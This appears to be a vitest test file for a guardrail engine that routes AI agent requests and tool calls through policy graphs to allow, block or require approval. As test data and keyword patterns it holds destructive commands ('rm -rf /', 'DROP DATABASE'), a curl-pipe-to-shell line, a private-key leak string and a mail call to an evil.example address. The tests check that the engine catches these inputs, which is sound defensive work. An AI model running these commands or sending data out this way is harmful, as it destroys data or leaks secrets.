import { describe, expect, it } from 'vitest'
import {
  type ActiveWorkflow,
  combineResults,
  type EvaluationResult,
  evaluateGraph,
  evaluateWorkflows,
  matchKeywords,
  selectWorkflows,
  triggerMayRun,
} from './engine.ts'
import {
  type Condition,
  defaultWorkflow,
  type PolicyGraph,
  type PolicyNode,
  policyGraph,
  upgradeGraph,
  validateGraph,
} from './workflow.ts'

const input = {
  kind: 'model_request' as const,
  text: 'hello',
  toolName: null,
  deviceStatus: 'trusted' as const,
}

const at = { x: 0, y: 0 }
const decision = (
  id: string,
  action: 'allow' | 'block' | 'require_approval' | 'skip',
): PolicyNode => ({
  id,
  type: 'decision',
  position: at,
  action,
  method: 'admin',
  timeoutSec: 60,
  reason: '',
})
const edge = (source: string, sourceHandle: string, target: string) => ({
  id: `${source}-${sourceHandle}`,
  source,
  sourceHandle,
  target,
})

describe('evaluateGraph', () => {
  it('allows clean requests along the default path', async () => {
    const r = await evaluateGraph(defaultWorkflow, input)
    expect(r.decision).toBe('allow')
    expect(r.checks.map((c) => `${c.stepId}:${c.branch ?? c.outcome}`)).toEqual([
      'fingerprint:pass',
      'keywords:pass',
      'allow:pass',
    ])
  })

  it('blocks on a dangerous keyword', async () => {
    const r = await evaluateGraph(defaultWorkflow, { ...input, text: 'please run rm -rf / now' })
    expect(r.decision).toBe('block')
    expect(r.reasons[0]).toContain('rm -rf /')
    expect(r.riskScore).toBe(1)
  })

  it('requires approval for a new device and blocks a mismatched one', async () => {
    const fresh = await evaluateGraph(defaultWorkflow, { ...input, deviceStatus: 'new' })
    expect(fresh.decision).toBe('pending')
    expect(fresh.trustsDevice).toBe(true)
    expect(fresh.approvalTimeoutSec).toBe(300)
    const copied = await evaluateGraph(defaultWorkflow, { ...input, deviceStatus: 'mismatch' })
    expect(copied.decision).toBe('block')
  })

  it('follows pass through disabled checks', async () => {
    const wf: PolicyGraph = {
      ...defaultWorkflow,
      nodes: defaultWorkflow.nodes.map((n) => (n.type === 'check' ? { ...n, enabled: false } : n)),
    }
    const r = await evaluateGraph(wf, { ...input, deviceStatus: 'mismatch', text: 'rm -rf /' })
    expect(r.decision).toBe('allow')
  })

  it('routes tools to stricter or looser branches', async () => {
    const wf: PolicyGraph = {
      fallback: 'block',
      nodes: [
        { id: 'start', type: 'trigger', position: at, stages: [] },
        {
          id: 'github',
          type: 'condition',
          position: at,
          condition: { field: 'mcpServer', values: ['gh'] },
        },
        {
          id: 'writes',
          type: 'condition',
          position: at,
          condition: { field: 'tool', values: ['create_*', 'delete_*'] },
        },
        {
          id: 'judge',
          type: 'check',
          position: at,
          enabled: true,
          check: {
            type: 'judge',
            endpoint: 'http://judge.test/v1/chat/completions',
            model: 'm',
            threshold: 0.5,
            timeoutMs: 1000,
            instructions: '',
          },
        },
        decision('allow', 'allow'),
        decision('approve', 'require_approval'),
      ],
      edges: [
        edge('start', 'next', 'github'),
        edge('github', 'yes', 'writes'),
        edge('github', 'no', 'allow'),
        edge('writes', 'yes', 'judge'),
        edge('writes', 'no', 'allow'),
        edge('judge', 'pass', 'allow'),
        edge('judge', 'fail', 'approve'),
      ],
    }
    const tool = { ...input, kind: 'tool_call' as const, mcpServerId: 'gh' }
    const risky = { judge: async () => ({ score: 0.9, reason: 'exfil' }) }

    const read = await evaluateGraph(wf, { ...tool, toolName: 'gh__list_issues' }, risky)
    expect(read.decision).toBe('allow')

    const write = await evaluateGraph(wf, { ...tool, toolName: 'gh__delete_repo' }, risky)
    expect(write.decision).toBe('pending')
    expect(write.riskScore).toBe(0.9)
    expect(write.approvalTimeoutSec).toBe(60)

    const down = await evaluateGraph(
      wf,
      { ...tool, toolName: 'gh__create_issue' },
      {
        judge: async () => {
          throw new Error('timeout')
        },
      },
    )
    // A judge that cannot answer follows the workflow fallback, like an unconnected output.
    expect(down.checks.find((c) => c.stepId === 'judge')?.outcome).toBe('error')
    expect(down.decision).toBe(wf.fallback)
    expect(down.reasons.at(-1)).toContain('workflow fallback')
  })

  it('uses the fallback when an output is not connected', async () => {
    const wf: PolicyGraph = {
      ...defaultWorkflow,
      edges: defaultWorkflow.edges.filter((e) => e.sourceHandle !== 'fail'),
    }
    const r = await evaluateGraph(wf, { ...input, text: 'DROP DATABASE prod' })
    expect(r.decision).toBe('block')
    expect(r.reasons.at(-1)).toContain('keywords → fail')
    expect(
      (await evaluateGraph({ ...wf, fallback: 'allow' }, { ...input, text: 'DROP DATABASE' }))
        .decision,
    ).toBe('allow')
  })

  it('reports the redaction on the path', async () => {
    const wf: PolicyGraph = {
      fallback: 'block',
      nodes: [
        { id: 'start', type: 'trigger', position: at, stages: [] },
        {
          id: 'redact',
          type: 'check',
          position: at,
          enabled: true,
          check: { type: 'redact', secrets: true, pii: ['email'] },
        },
        decision('allow', 'allow'),
      ],
      edges: [edge('start', 'next', 'redact'), edge('redact', 'pass', 'allow')],
    }
    expect((await evaluateGraph(wf, input)).redact).toEqual({
      type: 'redact',
      secrets: true,
      pii: ['email'],
    })
  })
})

describe('validateGraph', () => {
  it('accepts the default workflow', () => {
    expect(validateGraph(defaultWorkflow)).toEqual([])
  })

  it('rejects loops, bad handles and doubled outputs', () => {
    const wf: PolicyGraph = {
      ...defaultWorkflow,
      edges: [
        ...defaultWorkflow.edges,
        edge('keywords', 'pass', 'fingerprint'),
        edge('keywords', 'nope', 'block'),
      ],
    }
    const messages = validateGraph(wf)
      .filter((i) => i.level === 'error')
      .map((i) => i.message)
    expect(messages).toContain('The workflow contains a loop')
    expect(messages).toContain('Unknown output "nope"')
    expect(messages).toContain('An output can only connect once')
  })
})

describe('evaluateWorkflows', () => {
  const graph = (
    trigger: Partial<Extract<PolicyNode, { type: 'trigger' }>>,
    end: PolicyNode,
  ): PolicyGraph => ({
    fallback: 'block',
    nodes: [{ id: 'start', type: 'trigger', position: at, stages: [], ...trigger }, end],
    edges: [edge('start', 'next', end.id)],
  })
  const workflow = (id: string, definition: PolicyGraph, groupIds: string[] = []) => ({
    id,
    name: id,
    version: 1,
    groupIds,
    definition,
  })
  const toolCall = {
    ...input,
    kind: 'tool_call' as const,
    toolName: 'github__delete_repo',
    mcpServerId: 'srv_github',
    groupIds: ['grp_dev'],
  }

  it('allows a request that triggers no workflow', async () => {
    const onlyPrompts = graph({ stages: ['model_request'] }, decision('b', 'block'))
    const r = await evaluateWorkflows([workflow('prompts', onlyPrompts)], toolCall)
    expect(r.decision).toBe('allow')
    expect(r.workflows).toEqual([])
    expect(r.checks).toEqual([])
  })

  it('a workflow whose conditions end in Skip does not apply', async () => {
    /** Start → condition → allow on Yes, Skip on No. */
    const applies = (id: string, c: Condition): ActiveWorkflow =>
      workflow(id, {
        fallback: 'block',
        nodes: [
          { id: 'start', type: 'trigger', position: at, stages: [] },
          { id: 'if', type: 'condition', position: at, condition: c },
          decision('b', 'block'),
          decision('s', 'skip'),
        ],
        edges: [edge('start', 'next', 'if'), edge('if', 'yes', 'b'), edge('if', 'no', 's')],
      })
    const r = await evaluateWorkflows(
      [
        applies('tool', { field: 'tool', values: ['delete_*'] }),
        applies('server', { field: 'mcpServer', values: ['srv_slack'] }),
      ],
      toolCall,
    )
    expect(r.decision).toBe('block')
    expect(r.workflows.map((w) => `${w.id}:${w.decision}`)).toEqual(['tool:block', 'server:skip'])
  })

  it('only runs for the selected groups', () => {
    const everyone = graph({}, decision('a', 'allow'))
    const picked = selectWorkflows(
      [
        workflow('dev', everyone, ['grp_dev']),
        workflow('ops', everyone, ['grp_ops']),
        workflow('all', everyone),
      ],
      toolCall,
    )
    expect(picked.map((w) => w.id)).toEqual(['dev', 'all'])
  })

  it('keeps the strictest outcome and tags steps with their workflow', async () => {
    const r = await evaluateWorkflows(
      [
        workflow('allow', graph({}, decision('a', 'allow'))),
        workflow('approve', graph({}, decision('h', 'require_approval'))),
        workflow(
          'block',
          graph({}, { ...decision('b', 'block'), reason: 'No deletes' } as PolicyNode),
        ),
      ],
      toolCall,
    )
    expect(r.decision).toBe('block')
    expect(r.reasons).toEqual(['No deletes'])
    expect(r.workflows.map((w) => w.id)).toEqual(['allow', 'approve', 'block'])
    expect(r.checks.map((c) => `${c.workflowId}:${c.stepId}`)).toEqual([
      'allow:a',
      'approve:h',
      'block:b',
    ])
  })

  it('asks for the strictest approval method', async () => {
    const touchid = { ...decision('t', 'require_approval'), method: 'touchid' } as PolicyNode
    const r = await evaluateWorkflows(
      [
        workflow('device', graph({}, touchid)),
        workflow('admin', graph({}, decision('h', 'require_approval'))),
      ],
      toolCall,
    )
    expect(r.decision).toBe('pending')
    expect(r.approvalMethod).toBe('admin')
    expect(r.reasons).not.toContain('Needs Touch ID on the device')
  })
  it('records what each workflow decided and how long it took', async () => {
    let t = 0
    const r = await evaluateWorkflows(
      [
        workflow('allow', graph({}, decision('a', 'allow'))),
        workflow('block', graph({}, decision('b', 'block'))),
      ],
      toolCall,
      { now: () => (t += 5) },
    )
    expect(r.workflows.map((w) => `${w.id}:${w.decision}`)).toEqual(['allow:allow', 'block:block'])
    expect(r.workflows.every((w) => typeof w.durationMs === 'number')).toBe(true)
  })

  it('knows which stages a workflow could start on', () => {
    const outputs = graph({ stages: ['model_output'] }, decision('a', 'allow'))
    expect(triggerMayRun(outputs, ['model_output', 'tool_call'])).toBe(true)
    expect(triggerMayRun(outputs, ['tool_call'])).toBe(false)
    expect(triggerMayRun(graph({}, decision('a', 'allow')), ['tool_call'])).toBe(true)
  })

  it('a workflow without stages runs on every stage', () => {
    const any = workflow('any', graph({}, decision('a', 'allow')))
    const outputsOnly = workflow(
      'outputs',
      graph({ stages: ['model_output'] }, decision('a', 'allow')),
    )
    for (const kind of ['model_request', 'tool_result', 'model_output', 'agent_message'] as const) {
      const picked = selectWorkflows([any, outputsOnly], { ...input, kind })
      expect(picked.map((w) => w.id)).toEqual(
        kind === 'model_output' ? ['any', 'outputs'] : ['any'],
      )
    }
  })
})

describe('stages', () => {
  const chain = (check: PolicyNode, fallback: 'allow' | 'block' = 'block'): PolicyGraph => ({
    fallback,
    nodes: [
      { id: 'start', type: 'trigger', position: at, stages: [] },
      check,
      decision('allow', 'allow'),
      decision('block', 'block'),
    ],
    edges: [
      edge('start', 'next', check.id),
      edge(check.id, 'pass', 'allow'),
      edge(check.id, 'fail', 'block'),
      edge(check.id, 'mismatch', 'block'),
      edge(check.id, 'over', 'block'),
      edge(check.id, 'warn', 'allow'),
    ],
  })
  const check = (c: Extract<PolicyNode, { type: 'check' }>['check']): PolicyNode => ({
    id: 'c',
    type: 'check',
    position: at,
    enabled: true,
    check: c,
  })

  it('skips device checks on tool results and model output', async () => {
    const wf = chain(check({ type: 'fingerprint' }))
    for (const kind of ['tool_result', 'model_output'] as const) {
      const r = await evaluateGraph(wf, { ...input, kind, deviceStatus: 'mismatch' })
      expect(r.decision).toBe('allow')
      expect(r.checks[0]).toMatchObject({
        outcome: 'skipped',
        reason: expect.stringMatching(/^Not used on/),
      })
    }
    const prompt = await evaluateGraph(wf, { ...input, deviceStatus: 'mismatch' })
    expect(prompt.decision).toBe('block')
  })

  it('applies argument rules only to tool calls', async () => {
    const wf = chain(
      check({
        type: 'arguments',
        rules: [{ tool: '*', argument: 'to', pattern: '@co\\.com$', message: '' }],
      }),
    )
    const args = { toolName: 'mail__send', toolArguments: { to: 'x@evil.example' } }
    expect((await evaluateGraph(wf, { ...input, ...args, kind: 'tool_call' })).decision).toBe(
      'block',
    )
    expect((await evaluateGraph(wf, { ...input, ...args, kind: 'tool_result' })).decision).toBe(
      'allow',
    )
  })

  it('scans model output for keywords', async () => {
    const wf = chain(
      check({
        type: 'keywords',
        patterns: ['BEGIN RSA PRIVATE KEY'],
        mode: 'substring',
        caseSensitive: false,
      }),
    )
    const leak = await evaluateGraph(wf, {
      ...input,
      kind: 'model_output',
      text: 'here you go: -----BEGIN RSA PRIVATE KEY-----',
    })
    expect(leak.decision).toBe('block')
    const clean = await evaluateGraph(wf, { ...input, kind: 'model_output', text: 'done' })
    expect(clean.decision).toBe('allow')
  })

  it('turns an approval on model output into a block', async () => {
    const wf: PolicyGraph = {
      fallback: 'allow',
      nodes: [
        { id: 'start', type: 'trigger', position: at, stages: [] },
        decision('hold', 'require_approval'),
      ],
      edges: [edge('start', 'next', 'hold')],
    }
    expect((await evaluateGraph(wf, { ...input, kind: 'model_output' })).decision).toBe('block')
    expect((await evaluateGraph(wf, { ...input, kind: 'tool_call' })).decision).toBe('pending')
  })

  it('routes on the tool source', async () => {
    const wf: PolicyGraph = {
      fallback: 'block',
      nodes: [
        { id: 'start', type: 'trigger', position: at, stages: [] },
        {
          id: 'mcp',
          type: 'condition',
          position: at,
          condition: { field: 'source', values: ['mcp'] },
        },
        decision('allow', 'allow'),
        decision('block', 'block'),
      ],
      edges: [
        edge('start', 'next', 'mcp'),
        edge('mcp', 'yes', 'block'),
        edge('mcp', 'no', 'allow'),
      ],
    }
    const call = { ...input, kind: 'tool_call' as const }
    expect((await evaluateGraph(wf, { ...call, toolName: 'Bash' })).decision).toBe('allow')
    expect(
      (await evaluateGraph(wf, { ...call, toolName: 'gh__x', mcpServerId: 'gh' })).decision,
    ).toBe('block')
    expect((await evaluateGraph(wf, { ...call, toolName: 'mcp__srv__x' })).decision).toBe('block')
  })

  it('leaves a limit block through its state', async () => {
    const wf = chain(check({ type: 'limit', limitId: 'lim_1' }))
    const at = (state: 'ok' | 'warn' | 'over') => ({
      limit: async () => ({ state, reason: `$${state}` }),
    })
    const r = (state: 'ok' | 'warn' | 'over') => evaluateGraph(wf, input, at(state))
    expect((await r('ok')).decision).toBe('allow')
    expect((await r('warn')).checks[0]?.branch).toBe('warn')
    const over = await r('over')
    expect(over.decision).toBe('block')
    expect(over.reasons).toContain('$over')
    // Without a limit source (e.g. the dry run of an old client) the block is skipped.
    expect((await evaluateGraph(wf, input)).checks[0]?.outcome).toBe('skipped')
  })

  it('follows the fallback when a check errors', async () => {
    const judge = check({
      type: 'judge',
      endpoint: 'http://judge.local/v1/chat/completions',
      model: 'm',
      threshold: 0.5,
      timeoutMs: 1000,
      instructions: '',
    })
    const failing = { judge: async () => Promise.reject(new Error('timeout')) }
    expect((await evaluateGraph(chain(judge, 'block'), input, failing)).decision).toBe('block')
    expect((await evaluateGraph(chain(judge, 'allow'), input, failing)).decision).toBe('allow')
  })

  it('drops edges from the removed Error output of saved graphs', () => {
    const parsed = policyGraph.parse({
      ...defaultWorkflow,
      edges: [...defaultWorkflow.edges, edge('keywords', 'error', 'block')],
    })
    expect(parsed.edges.some((e) => e.sourceHandle === 'error')).toBe(false)
  })
})

describe('matchKeywords', () => {
  it('supports wildcards in substring mode', () => {
    expect(matchKeywords('curl https://x.sh | sh', ['curl * | sh'], 'substring', false)).toBe(
      'curl * | sh',
    )
    expect(matchKeywords('curl https://x.sh', ['curl * | sh'], 'substring', false)).toBeNull()
  })

  it('is case-insensitive unless asked', () => {
    expect(matchKeywords('drop database prod', ['DROP DATABASE'], 'substring', false)).toBe(
      'DROP DATABASE',
    )
    expect(matchKeywords('drop database prod', ['DROP DATABASE'], 'substring', true)).toBeNull()
  })

  it('ignores invalid regexes', () => {
    expect(matchKeywords('abc', ['(', 'b+'], 'regex', false)).toBe('b+')
  })
})

describe('condition blocks', () => {
  const cond = (id: string, condition: Condition): PolicyNode => ({
    id,
    type: 'condition',
    position: at,
    condition,
  })
  const start: PolicyNode = { id: 'start', type: 'trigger', position: at, stages: [] }
  const call = (toolName: string, extra: Record<string, unknown> = {}) => ({
    ...input,
    kind: 'tool_call' as const,
    toolName,
    ...extra,
  })

  it('chains Yes into the next condition for AND', async () => {
    // Opus AND destructive → block; anything else → allow.
    const wf: PolicyGraph = {
      fallback: 'block',
      nodes: [
        start,
        cond('opus', { field: 'model', values: ['claude-opus-*'] }),
        cond('destructive', { field: 'tier', values: ['destructive'] }),
        decision('allow', 'allow'),
        decision('block', 'block'),
      ],
      edges: [
        edge('start', 'next', 'opus'),
        edge('opus', 'yes', 'destructive'),
        edge('opus', 'no', 'allow'),
        edge('destructive', 'yes', 'block'),
        edge('destructive', 'no', 'allow'),
      ],
    }
    const run = (model: string, toolTier: 'read' | 'destructive') =>
      evaluateGraph(wf, call('gh__delete_repo', { model, toolTier }))
    expect((await run('claude-opus-4-5', 'destructive')).decision).toBe('block')
    expect((await run('claude-opus-4-5', 'read')).decision).toBe('allow')
    expect((await run('claude-haiku-4-5', 'destructive')).decision).toBe('allow')
    const path = (await run('claude-opus-4-5', 'destructive')).checks
    expect(path.map((c) => `${c.stepId}:${c.branch ?? c.outcome}`)).toEqual([
      'opus:yes',
      'destructive:yes',
      'block:fail',
    ])
    expect(path[0]?.reason).toBe('Model: claude-opus-*')
  })

  it('chains No into the next condition for OR, both Yes into one block', async () => {
    // Bash OR Write → argument check (two incoming edges); anything else → allow.
    const wf: PolicyGraph = {
      fallback: 'block',
      nodes: [
        start,
        cond('bash', { field: 'tool', values: ['Bash'] }),
        cond('write', { field: 'tool', values: ['Write'] }),
        {
          id: 'kw',
          type: 'check',
          position: at,
          enabled: true,
          check: {
            type: 'keywords',
            patterns: ['rm -rf'],
            mode: 'substring',
            caseSensitive: false,
          },
        },
        decision('allow', 'allow'),
        decision('block', 'block'),
      ],
      edges: [
        edge('start', 'next', 'bash'),
        edge('bash', 'yes', 'kw'),
        edge('bash', 'no', 'write'),
        edge('write', 'yes', 'kw'),
        edge('write', 'no', 'allow'),
        edge('kw', 'pass', 'allow'),
        edge('kw', 'fail', 'block'),
      ],
    }
    expect(validateGraph(wf).filter((i) => i.level === 'error')).toEqual([])
    const run = (tool: string) => evaluateGraph(wf, { ...call(tool), text: 'rm -rf build' })
    expect((await run('Bash')).decision).toBe('block')
    expect((await run('Write')).decision).toBe('block')
    expect((await run('Read')).decision).toBe('allow')
    expect((await run('Read')).checks.some((c) => c.stepId === 'kw')).toBe(false)
  })

  it('flags a condition without values', () => {
    const wf: PolicyGraph = {
      fallback: 'block',
      nodes: [start, cond('empty', { field: 'tool', values: [] }), decision('allow', 'allow')],
      edges: [edge('start', 'next', 'empty'), edge('empty', 'yes', 'allow')],
    }
    expect(validateGraph(wf)).toContainEqual(
      expect.objectContaining({ level: 'error', nodeId: 'empty' }),
    )
  })

  it('ends in Skip without a decision', async () => {
    const wf: PolicyGraph = {
      fallback: 'block',
      nodes: [start, decision('skip', 'skip')],
      edges: [edge('start', 'next', 'skip')],
    }
    const r = await evaluateGraph(wf, input)
    expect(r.decision).toBe('skip')
    expect(r.reasons).toEqual([])
    expect(r.riskScore).toBe(0)
    expect(r.checks.at(-1)).toMatchObject({ stepId: 'skip', outcome: 'skipped' })
  })
})

describe('combineResults with skipped workflows', () => {
  const result = (
    decision: EvaluationResult['decision'],
    extra: Partial<EvaluationResult> = {},
  ): EvaluationResult => ({
    decision,
    checks: [],
    riskScore: decision === 'block' ? 1 : 0,
    reasons: decision === 'block' ? ['nope'] : [],
    approvalTimeoutSec: 300,
    approvalMethod: null,
    trustsDevice: false,
    redact: null,
    ...extra,
  })
  const wf = (id: string, r: EvaluationResult) => ({
    workflow: { id, name: id, version: 1 },
    result: r,
  })

  it('lets the workflows that applied decide', () => {
    const r = combineResults([wf('a', result('skip')), wf('b', result('allow'))])
    expect(r.decision).toBe('allow')
    expect(r.workflows.map((w) => w.decision)).toEqual(['skip', 'allow'])
  })

  it('allows when every workflow skipped, and still lists them', () => {
    const r = combineResults([wf('a', result('skip')), wf('b', result('skip'))])
    expect(r.decision).toBe('allow')
    expect(r.workflows.map((w) => `${w.id}:${w.decision}`)).toEqual(['a:skip', 'b:skip'])
  })

  it('a skip never softens a block', () => {
    const r = combineResults([wf('a', result('skip')), wf('b', result('block'))])
    expect(r.decision).toBe('block')
    expect(r.reasons).toEqual(['nope'])
    expect(r.riskScore).toBe(1)
  })

  it('ignores redaction and risk from skipped workflows', () => {
    const redact = { type: 'redact' as const, secrets: true, pii: [] }
    const r = combineResults([
      wf('a', result('skip', { redact, riskScore: 0.9 })),
      wf('b', result('allow')),
    ])
    expect(r.redact).toBeNull()
    expect(r.riskScore).toBe(0)
  })
})

describe('upgradeGraph', () => {
  const legacy = (trigger: Record<string, unknown>, extra: Record<string, unknown>[] = []) => ({
    fallback: 'block',
    nodes: [
      { id: 'start', type: 'trigger', position: at, ...trigger },
      { id: 'allow', type: 'decision', position: at, action: 'allow' },
      ...extra,
    ],
    edges: [edge('start', 'next', 'allow')],
  })
  const outgoing = (g: PolicyGraph, id: string) =>
    Object.fromEntries(
      g.edges.filter((e) => e.source === id).map((e) => [e.sourceHandle, e.target]),
    )

  it('turns stage conditions into stages and the rest into a chain ending in Skip', async () => {
    const g = policyGraph.parse(
      legacy({
        mode: 'all',
        conditions: [
          { field: 'kind', values: ['tool_call', 'tool_result'] },
          { field: 'tool', values: ['Bash'] },
          { field: 'group', values: ['grp_dev'] },
        ],
      }),
    )
    const start = g.nodes.find((n) => n.type === 'trigger')!
    expect(start).toMatchObject({ stages: ['tool_call', 'tool_result'] })
    expect(start).not.toHaveProperty('conditions')
    const first = outgoing(g, 'start').next!
    const tool = g.nodes.find((n) => n.id === first)!
    expect(tool).toMatchObject({
      type: 'condition',
      condition: { field: 'tool', values: ['Bash'] },
    })
    const second = outgoing(g, first).yes!
    expect(g.nodes.find((n) => n.id === second)).toMatchObject({
      condition: { field: 'group' },
    })
    expect(outgoing(g, second).yes).toBe('allow')
    const skip = outgoing(g, first).no!
    expect(outgoing(g, second).no).toBe(skip)
    expect(g.nodes.find((n) => n.id === skip)).toMatchObject({ type: 'decision', action: 'skip' })

    // Same behaviour as before: Bash from the dev group runs, anything else does not apply.
    const call = { ...input, kind: 'tool_call' as const, toolName: 'Bash', groupIds: ['grp_dev'] }
    expect((await evaluateGraph(g, call)).decision).toBe('allow')
    expect((await evaluateGraph(g, { ...call, toolName: 'Edit' })).decision).toBe('skip')
    expect(validateGraph(g).filter((i) => i.level === 'error')).toEqual([])
  })

  it('keeps every stage and chains all conditions with OR in any mode', async () => {
    const g = policyGraph.parse(
      legacy({
        mode: 'any',
        conditions: [
          { field: 'kind', values: ['model_output'] },
          { field: 'tool', values: ['Bash'] },
        ],
      }),
    )
    expect(g.nodes.find((n) => n.type === 'trigger')).toMatchObject({ stages: [] })
    const first = outgoing(g, 'start').next!
    expect(outgoing(g, first).yes).toBe('allow')
    const second = outgoing(g, first).no!
    expect(outgoing(g, second).yes).toBe('allow')
    expect((await evaluateGraph(g, { ...input, kind: 'model_output' })).decision).toBe('allow')
    expect(
      (await evaluateGraph(g, { ...input, kind: 'tool_call', toolName: 'Bash' })).decision,
    ).toBe('allow')
    expect(
      (await evaluateGraph(g, { ...input, kind: 'tool_call', toolName: 'Read' })).decision,
    ).toBe('skip')
  })

  it('keeps only stages when the start node had nothing else', () => {
    const g = policyGraph.parse(
      legacy({ mode: 'any', conditions: [{ field: 'kind', values: ['tool_call'] }] }),
    )
    expect(g.nodes.find((n) => n.type === 'trigger')).toMatchObject({ stages: ['tool_call'] })
    expect(outgoing(g, 'start').next).toBe('allow')
    expect(g.nodes.some((n) => n.type === 'condition')).toBe(false)
  })

  const routeGraph = (mode: 'all' | 'any') => ({
    fallback: 'block',
    nodes: [
      { id: 'start', type: 'trigger', position: at, mode: 'all', conditions: [] },
      {
        id: 'writes',
        type: 'match',
        position: at,
        label: 'GitHub writes',
        mode,
        conditions: [
          { field: 'mcpServer', values: ['gh'] },
          { field: 'tool', values: ['delete_*'] },
        ],
      },
      { id: 'block', type: 'decision', position: at, action: 'block' },
      { id: 'allow', type: 'decision', position: at, action: 'allow' },
    ],
    edges: [
      edge('start', 'next', 'writes'),
      edge('writes', 'match', 'block'),
      edge('writes', 'else', 'allow'),
    ],
  })

  it('turns an all Route into an AND chain that keeps its id', async () => {
    const g = policyGraph.parse(routeGraph('all'))
    expect(outgoing(g, 'start').next).toBe('writes')
    expect(g.nodes.find((n) => n.id === 'writes')).toMatchObject({ type: 'condition' })
    const second = outgoing(g, 'writes').yes!
    expect(outgoing(g, 'writes').no).toBe('allow')
    expect(outgoing(g, second)).toEqual({ yes: 'block', no: 'allow' })
    const call = { ...input, kind: 'tool_call' as const, mcpServerId: 'gh' }
    expect((await evaluateGraph(g, { ...call, toolName: 'gh__delete_x' })).decision).toBe('block')
    expect((await evaluateGraph(g, { ...call, toolName: 'gh__list' })).decision).toBe('allow')
  })

  it('turns an any Route into an OR chain', async () => {
    const g = policyGraph.parse(routeGraph('any'))
    const second = outgoing(g, 'writes').no!
    expect(outgoing(g, 'writes').yes).toBe('block')
    expect(outgoing(g, second)).toEqual({ yes: 'block', no: 'allow' })
    const call = { ...input, kind: 'tool_call' as const }
    expect((await evaluateGraph(g, { ...call, toolName: 'x__delete_y' })).decision).toBe('block')
    expect((await evaluateGraph(g, { ...call, toolName: 'x__list' })).decision).toBe('allow')
  })

  it('passes new graphs through unchanged and is idempotent', () => {
    expect(upgradeGraph(defaultWorkflow)).toBe(defaultWorkflow)
    for (const raw of [
      routeGraph('all'),
      routeGraph('any'),
      legacy({ mode: 'all', conditions: [{ field: 'tool', values: ['Bash'] }] }),
    ]) {
      const once = policyGraph.parse(raw)
      expect(policyGraph.parse(once)).toEqual(once)
    }
  })
})
